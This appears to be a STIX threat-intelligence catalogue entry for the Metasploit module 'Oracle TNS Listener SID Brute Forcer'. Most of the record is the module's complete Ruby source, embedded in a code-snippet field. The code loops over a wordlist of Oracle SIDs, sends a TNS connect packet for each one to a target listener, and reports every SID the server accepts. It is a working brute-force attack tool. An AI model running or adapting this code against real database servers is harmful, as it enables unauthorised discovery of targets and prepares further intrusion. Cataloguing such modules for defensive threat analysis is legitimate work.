{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2ae37777-4d73-4013-9f50-a3fafdf0c842",
    "created": "2024-08-14T16:22:52.288575Z",
    "modified": "2024-08-14T16:22:52.288579Z",
    "name": "Oracle TNS Listener SID Brute Forcer",
    "description": " This module simply attempts to discover the protected SID. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/oracle/sid_brute.rb",
            "external_id": "sid_brute.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.metasploit.com/users/mc"
        },
        {
            "source_name": "reference",
            "url": "http://www.red-database-security.com/scripts/sid.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::TNS\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle TNS Listener SID Brute Forcer',\n      'Description'    => %q{\n        This module simply attempts to discover the protected SID.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'https://www.metasploit.com/users/mc' ],\n          [ 'URL' , 'http://www.red-database-security.com/scripts/sid.txt' ],\n        ],\n      'DisclosureDate' => '2009-01-07'))\n\n    register_options(\n      [\n        Opt::RPORT(1521),\n        OptString.new('SLEEP', [ false,   'Sleep() amount between each request.', '1']),\n        OptString.new('SIDFILE', [ false, 'The file that contains a list of sids.', File.join(Msf::Config.install_root, 'data', 'wordlists', 'sid.txt')]),\n      ])\n\n  end\n\n  def run\n\n    s    = datastore['SLEEP']\n    list = datastore['SIDFILE']\n\n    print_status(\"Starting brute force on #{rhost}, using sids from #{list}...\")\n\n    fd = ::File.open(list, 'rb').each do |sid|\n      login = \"(DESCRIPTION=(CONNECT_DATA=(SID=#{sid})(CID=(PROGRAM=)(HOST=MSF)(USER=)))(ADDRESS=(PROTOCOL=tcp)(HOST=#{rhost})(PORT=#{rport})))\"\n      pkt = tns_packet(login)\n\n      begin\n        connect\n      rescue ::Interrupt\n        raise $!\n      rescue => e\n        print_error(e.to_s)\n        disconnect\n        return\n      end\n\n      sock.put(pkt)\n      select(nil,nil,nil,s.to_i)\n      res = sock.get_once\n      disconnect\n\n      if res and res.to_s !~ /ERROR_STACK/\n        report_note(\n          :host => rhost,\n          :port => rport,\n          :type => 'oracle_sid',\n          :data => \"PORT=#{rport}, SID=#{sid.strip}\",\n          :update => :unique_data\n        )\n        print_good(\"#{rhost}:#{rport} Found SID '#{sid.strip}'\")\n      end\n\n    end\n\n    print_status(\"Done with brute force...\")\n    fd.close\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-01-07"
}